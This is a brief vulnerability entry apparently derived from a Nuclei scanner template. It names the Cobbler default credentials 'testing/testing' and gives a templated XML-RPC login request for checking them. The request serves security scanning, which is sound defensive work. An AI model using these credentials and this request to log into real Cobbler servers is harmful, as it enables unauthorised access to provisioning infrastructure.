# Vulnerability: Cobbler Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`cobbler-default-login.yaml`)

## Description
Cobbler default login credentials for the testing module (testing/testing) were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/cobbler_api HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

<?xml version='1.0'?>
<methodCall>
  <methodName>login</methodName>
  <params>
    <param>
      <value>
        <string>{{username}}</string>
      </value>
    </param>
    <param>
      <value>
        <string>{{password}}</string>
      </value>
    </param>
  </params>
</methodCall>
```

